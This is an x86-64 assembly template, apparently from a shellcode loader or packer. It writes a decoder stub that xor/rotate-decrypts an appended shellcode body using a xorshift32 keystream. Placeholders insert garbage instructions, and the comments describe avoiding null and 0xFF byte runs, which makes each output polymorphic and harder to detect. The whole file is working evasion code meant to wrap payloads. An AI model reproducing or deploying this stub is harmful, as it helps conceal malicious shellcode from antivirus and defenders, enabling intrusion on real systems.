.code64

// NOT use registers like r8, r9 for prevent
// appear a lot of instruction prefix about 0x48

// the ret and next labels are used to prevent
// "0x00, 0x00, 0x00" and "0xFF, 0xFF, 0xFF"
// about call or jmp instructions

// dr is used to get the register low 32bit
// igi means insert garbage instruction
// igs means insert garbage instruction with short version

// rax store the random seed
// rbx store the crypto key
// rcx store the loop times
// rdx store the xor shift median
// rsi store the body address
// rdi store the current value

header:
  // save context
  push {{.Reg.rax}}                            {{igi}}
  push {{.Reg.rbx}}                            {{igi}}
  push {{.Reg.rcx}}                            {{igi}}
  push {{.Reg.rdx}}                            {{igi}}
  push {{.Reg.rsi}}                            {{igi}}
  push {{.Reg.rdi}}                            {{igi}}
  pushfq                                       {{igi}}

  mov {{dr .Reg.rax}}, {{hex .Seed}}           {{igi}}
  mov {{dr .Reg.rbx}}, {{hex .Key}}            {{igi}}

  // prevent continuous 0x00
  mov {{dr .Reg.rcx}}, {{hex .NumLoopStub}}    {{igi}}
  xor {{dr .Reg.rcx}}, {{hex .NumLoopMaskA}}   {{igi}}
  xor {{dr .Reg.rcx}}, {{hex .NumLoopMaskB}}   {{igi}}

  // calculate the body address
  lea {{.Reg.rsi}}, [rip + body + {{hex .OffsetT}}]   {{igi}}
  add {{.Reg.rsi}}, {{hex .OffsetA}}                  {{igi}}
  sub {{.Reg.rsi}}, {{hex .OffsetS}}                  {{igi}}

  // decode shellcode body
 loop_xor:
  mov {{dr .Reg.rdi}}, [{{.Reg.rsi}}]          {{igs}}
  ror {{dr .Reg.rdi}}, 17                      {{igs}}
  xor {{dr .Reg.rdi}}, {{dr .Reg.rax}}         {{igs}}
  rol {{dr .Reg.rdi}}, 7                       {{igs}}
  xor {{dr .Reg.rdi}}, {{dr .Reg.rbx}}         {{igs}}
  mov [{{.Reg.rsi}}], {{dr .Reg.rdi}}          {{igs}}

  // call xor shift 32
  jmp xor_shift_32                             {{igs}}
 ret_1:

  // update address and counter
  add {{.Reg.rsi}}, 4                          {{igs}}
  dec {{dr .Reg.rcx}}                          {{igs}}
  jnz loop_xor                                 {{igs}}

  // skip function xor shift 32
  jmp next_1                                   {{igs}}

xor_shift_32:
  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igs}}
  shl {{dr .Reg.rdx}}, 13                      {{igs}}
  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igs}}
  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igs}}
  shr {{dr .Reg.rdx}}, 17                      {{igs}}
  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igs}}
  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igs}}
  shl {{dr .Reg.rdx}}, 5                       {{igs}}
  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igs}}
  jmp ret_1                                    {{igs}}
 next_1:

  // restore context
  popfq                                        {{igi}}
  pop {{.Reg.rdi}}                             {{igi}}
  pop {{.Reg.rsi}}                             {{igi}}
  pop {{.Reg.rdx}}                             {{igi}}
  pop {{.Reg.rcx}}                             {{igi}}
  pop {{.Reg.rbx}}                             {{igi}}
  pop {{.Reg.rax}}                             {{igi}}

body:
